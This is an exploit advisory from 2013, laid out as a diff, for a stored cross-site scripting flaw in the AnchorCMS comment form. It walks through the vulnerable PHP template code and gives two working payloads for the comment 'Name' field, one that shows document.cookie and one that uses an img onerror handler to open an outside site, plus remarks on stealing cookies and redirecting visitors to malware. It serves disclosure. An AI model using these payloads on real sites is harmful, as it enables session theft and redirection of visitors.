@@ -1,0 +1,67 @@
+# Exploit Title	:	AnchorCMS Stored XSS exploit v0.9.1
+# Exploit Author:	DURAKIBOX / dn5
+# Website		:	halisduraki.com
+# Email			:	duraki@null.net
+# Date			:	18.7.2013.
+# CMS uri		:	http://anchorcms.com/ 
+# Version 		:	AnchorCMS <= 0.9.1
+
+# About the CMS
+Anchor is a super-simple, lightweight blog system, made to let you just write. It's still a new CMS but it has a lot of options even if it's coded by one person. Inital coder is Visual Idiot. Anchor is open-source project also located on Github.
+
+# About the exploit
+-> File 	:	article.php file shows article/post page with text written by owners. If owner enable comments for specific post, attacker can execute 	 				malicious content using a comment form. The malicious content could be either JavaScript code, but may also include HTML, Flash etc.                The code is executed over form where "Name" field is actual vulnerability.
+
+				As seen in code bellow, the function "comment_form_url()" is called through POST action.				
+				<form id="comment" class="commentform wrap" method="post" action="<?php echo comment_form_url(); ?>#comment">
+
+				The code bellow show us a field which is vulnerable with function "comment_form_input_name"
+				<p class="name">
+					<label for="name">Your name:</label>
+					<?php echo comment_form_input_name('placeholder="Your name"'); ?>
+				</p>	
+
+
+				\functions\comments.php file contain function for posting comment. 
+				function comment_form_url() {
+					return Uri::to(Uri::current());
+				}
+
+
+				article.php file also contain a code for showing comments if they are enabled. The most specific one for us is function
+				"comment_name()" which is actual result of exploit.
+				<?php if(comments_open()): ?>
+						<?php if(has_comments()): ?>
+						<ul class="commentlist">
+							<?php $i = 0; while(comments()): $i++; ?>
+								...
+									<h2><?php echo comment_name(); ?></h2>
+								...
+									<span class="counter"><?php echo $i; ?></span>
+							<?php endwhile; ?>
+				<?php endif; ?>
+
+# PoC (Proof of Concept)
+Lets put some assumptions - CMS have original files
+						  - Article have comments enabled
+						   +++++++++++++++++++++++++++++++
+
+If we comment on article in this way -
+	Name 	:	<script>alert(document.cookie)</script>
+	Email	:	anything@service.com
+	Text 	:	Stored XSS
+
+	RESULT 	:	Who ever access article with comment above will get the same result, a cookie stored in.
+
+If we comment on article in this way -
+	Name 	:	<img src="http://redirect/exploit/" onerror=window.open("http://www.example.com","szck",'height=500,width=500');>
+	Email 	:	anything@service.com
+	Text 	:	Stored XSS
+
+	RESULT  :	Who ever access article with comment above will be redirected to "example.com" website.
+
+In both example we see that attacker can execute malicious code over stored-xss so users can infect their self, either expose their cookie over gate which attacker can set-up or download malware from redirected website.
+
+=======================================================
++ dn5 | @ludi_zeko | www.halisduraki.com
+=======================================================
